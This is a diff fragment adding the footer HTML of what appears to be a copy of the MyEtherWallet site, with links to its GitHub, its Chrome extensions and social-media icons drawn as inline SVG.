+        <a aria-label="my ether wallet github" href="https://github.com/kvhnuke/etherwallet" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Github: Current Site &amp; CX
+        </a>
+      </p>
+
+      <p>
+        <a aria-label="download &amp; run locally" href="../github.com/kvhnuke/etherwallet/releases/latest.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          Github: Latest Release
+        </a>
+      </p>
+
+      <p>
+        <a aria-label="my ether wallet chrome extension" href="https://chrome.google.com/webstore/detail/myetherwallet-cx/nlbmnnijcnlegkjjpcfjclmcfggfefdm?hl=en" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          MyEtherWallet Chrome Extension
+        </a>
+      </p>
+
+      <p>
+        <a aria-label="Anti-Phishing chrome extension" href="../chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn.html" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          EAL "Don't Get Phish'd" Chrome Extension
+        </a>
+      </p>
+
+      <p>
+        <a href="javascript:void(0)" aria-label="instagram" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="instagram icon" role="img" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#ffffff" d="M1152 896q0-106-75-181t-181-75-181 75-75 181 75 181 181 75 181-75 75-181zm138 0q0 164-115 279t-279 115-279-115-115-279 115-279 279-115 279 115 115 279zm108-410q0 38-27 65t-65 27-65-27-27-65 27-65 65-27 65 27 27 65zm-502-220q-7 0-76.5-.5t-105.5 0-96.5 3-103 10-71.5 18.5q-50 20-88 58t-58 88q-11 29-18.5 71.5t-10 103-3 96.5 0 105.5.5 76.5-.5 76.5 0 105.5 3 96.5 10 103 18.5 71.5q20 50 58 88t88 58q29 11 71.5 18.5t103 10 96.5 3 105.5 0 76.5-.5 76.5.5 105.5 0 96.5-3 103-10 71.5-18.5q50-20 88-58t58-88q11-29 18.5-71.5t10-103 3-96.5 0-105.5-.5-76.5.5-76.5 0-105.5-3-96.5-10-103-18.5-71.5q-20-50-58-88t-88-58q-29-11-71.5-18.5t-103-10-96.5-3-105.5 0-76.5.5zm768 630q0 229-5 317-10 208-124 322t-322 124q-88 5-317 5t-317-5q-208-10-322-124t-124-322q-5-88-5-317t5-317q10-208 124-322t322-124q88-5 317-5t317 5q208 10 322 124t124 322q5 88 5 317z"></path>
+          </svg>
+        </a>
+        <a aria-label="reddit" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="reddit icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M2.204 14.049c-.06.276-.091.56-.091.847 0 3.443 4.402 6.249 9.814 6.249 5.41 0 9.812-2.804 9.812-6.249 0-.274-.029-.546-.082-.809l-.015-.032c-.021-.055-.029-.11-.029-.165-.302-1.175-1.117-2.241-2.296-3.103-.045-.016-.088-.039-.126-.07-.026-.02-.045-.042-.067-.064-1.792-1.234-4.356-2.008-7.196-2.008-2.815 0-5.354.759-7.146 1.971-.014.018-.029.033-.049.049-.039.033-.084.06-.13.075-1.206.862-2.042 1.937-2.354 3.123 0 .058-.014.114-.037.171l-.008.015zm9.773 5.441c-1.794 0-3.057-.389-3.863-1.197-.173-.174-.173-.457 0-.632.176-.165.46-.165.635 0 .63.629 1.685.943 3.228.943 1.542 0 2.591-.3 3.219-.929.165-.164.45-.164.629 0 .165.18.165.465 0 .645-.809.808-2.065 1.198-3.862 1.198l.014-.028zm-3.606-7.573c-.914 0-1.677.765-1.677 1.677 0 .91.763 1.65 1.677 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm7.233 0c-.914 0-1.678.765-1.678 1.677 0 .91.764 1.65 1.678 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm4.548-1.595c1.037.833 1.8 1.821 2.189 2.904.45-.336.719-.864.719-1.449 0-1.002-.815-1.816-1.818-1.816-.399 0-.778.129-1.09.363v-.002zM2.711 9.963c-1.003 0-1.817.816-1.817 1.818 0 .543.239 1.048.644 1.389.401-1.079 1.172-2.053 2.213-2.876-.302-.21-.663-.329-1.039-.329v-.002zm9.217 12.079c-5.906 0-10.709-3.205-10.709-7.142 0-.275.023-.544.068-.809C.494 13.598 0 12.729 0 11.777c0-1.496 1.227-2.713 2.725-2.713.674 0 1.303.246 1.797.682 1.856-1.191 4.357-1.941 7.112-1.992l1.812-5.524.404.095s.016 0 .016.002l4.223.993c.344-.798 1.138-1.36 2.065-1.36 1.229 0 2.231 1.004 2.231 2.234 0 1.232-1.003 2.234-2.231 2.234s-2.23-1.004-2.23-2.23l-3.851-.912-1.467 4.477c2.65.105 5.047.854 6.844 2.021.494-.464 1.144-.719 1.833-.719 1.498 0 2.718 1.213 2.718 2.711 0 .987-.54 1.886-1.378 2.365.029.255.059.494.059.749-.015 3.938-4.806 7.143-10.72 7.143l-.034.009zm8.179-19.187c-.74 0-1.34.599-1.34 1.338 0 .738.6 1.34 1.34 1.34.732 0 1.33-.6 1.33-1.334 0-.733-.598-1.332-1.347-1.332l.017-.012z" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="twitter" title="twitter" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="twitter icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="facebook" title="facebook" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="facebook icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.676 0H1.324C.593 0 0 .593 0 1.324v21.352C0 23.408.593 24 1.324 24h11.494v-9.294H9.689v-3.621h3.129V8.41c0-3.099 1.894-4.785 4.659-4.785 1.325 0 2.464.097 2.796.141v3.24h-1.921c-1.5 0-1.792.721-1.792 1.771v2.311h3.584l-.465 3.63H16.56V24h6.115c.733 0 1.325-.592 1.325-1.324V1.324C24 .593 23.408 0 22.676 0" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="medium" title="medium" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="medium icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7.45 2.67l5.38 11.74H13c.86-1.93 1.6-3.91 2.4-5.87s1.6-3.9 2.35-5.86h5.66a3.67 3.67 0 0 1-.24.35c-.42.47-.83 1-1.28 1.41a1.61 1.61 0 0 0-.48 1.23v13a1.08 1.08 0 0 0 .38.86c.44.39.86.8 1.28 1.21l.41.42h-8.77a2.81 2.81 0 0 1 .26-.33c.41-.39.82-.79 1.25-1.16a1.22 1.22 0 0 0 .44-1V9.33c0-.44 0-.88.07-1.31V7.3h-.13c-.08.16-.18.31-.24.48l-5.3 13c-.07.18-.16.35-.25.52h-.12L4.23 7.16h-.14V16.42a1.93 1.93 0 0 0 .43 1.26c.77 1 1.52 2 2.28 3 .1.13.18.27.32.46H.5c.1-.17.17-.29.25-.39.79-1.05 1.59-2.11 2.39-3.15a1.81 1.81 0 0 0 .4-1.17v-10a1.51 1.51 0 0 0-.33-1C2.57 4.67 2 3.85 1.34 3c-.07-.1-.13-.21-.23-.36z" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="linkedin" title="linkedin" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="linkedin icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="github" title="github" href="javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="github icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12" fill="#ffffff"></path></svg>
+        </a>
+        <a aria-label="support email" title="support email" href=javascript:void(0)" target="_blank" rel="noopener noreferrer" role="link" tabindex="0">
+          <svg width="24" height="24" class="footer__icon" aria-labelledby="github icon" role="img" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path fill="#ffffff" d="M1664 1504v-768q-32 36-69 66-268 206-426 338-51 43-83 67t-86.5 48.5-102.5 24.5h-2q-48 0-102.5-24.5t-86.5-48.5-83-67q-158-132-426-338-37-30-69-66v768q0 13 9.5 22.5t22.5 9.5h1472q13 0 22.5-9.5t9.5-22.5zm0-1051v-24.5l-.5-13-3-12.5-5.5-9-9-7.5-14-2.5h-1472q-13 0-22.5 9.5t-9.5 22.5q0 168 147 284 193 152 401 317 6 5 35 29.5t46 37.5 44.5 31.5 50.5 27.5 43 9h2q20 0 43-9t50.5-27.5 44.5-31.5 46-37.5 35-29.5q208-165 401-317 54-43 100.5-115.5t46.5-131.5zm128-37v1088q0 66-47 113t-113 47h-1472q-66 0-113-47t-47-113v-1088q0-66 47-113t113-47h1472q66 0 113 47t47 113z"></path></svg>
+        </a>
+      </p>
+
+    </section>
+
+  </article>
+</footer></body>
+</html>
